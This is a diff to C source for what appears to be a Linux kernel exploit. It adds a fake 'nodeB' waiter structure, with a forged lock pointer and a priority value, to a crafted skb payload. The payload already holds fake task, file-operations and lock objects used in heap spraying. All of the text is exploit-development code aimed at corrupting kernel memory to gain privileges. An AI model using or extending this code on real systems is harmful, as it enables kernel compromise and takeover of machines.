@@ -32,6 +32,7 @@ uintptr_t g_ghost_kva;
 uintptr_t g_waiter_stack_hint;
 uintptr_t g_cc_parent;
 uintptr_t g_scratch_node;
+uintptr_t g_nodeb;
 uintptr_t binwrite_target;
 /* 1 while the staged SLIDE_SWAP table is live (see put_fake_fops_table):
  * configfs_read_once arms .read around each pread so system read()
@@ -1537,6 +1538,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
   g_scratch_node = payload_base + SCRATCH_OFF;  /* zeroed: black root, no children */
+  g_nodeb = payload_base + NODEB_OFF;
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     if (pselect_custom_write) {
       if (pselect_child_node) {
@@ -1863,6 +1865,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
     put32(p, LOCK_OFF + 0x00, 0);
+    for (int z = 0; z < 0x50; z += 8)
+      put64(p, NODEB_OFF + z, 0);
+    put64(p, NODEB_OFF + 0x38, fake_lock); /* nodeB ->lock equality */
+    put64(p, NODEB_OFF + 0x40, 50);        /* nodeB prio */
     /*
      * MODE4_LOCK_EMPTY=1: waiters root/leftmost=0, owner=0 — isolate whether
      * softboot is fake_lock.waiters→W0 / owner=fake_task (vs spray alone).
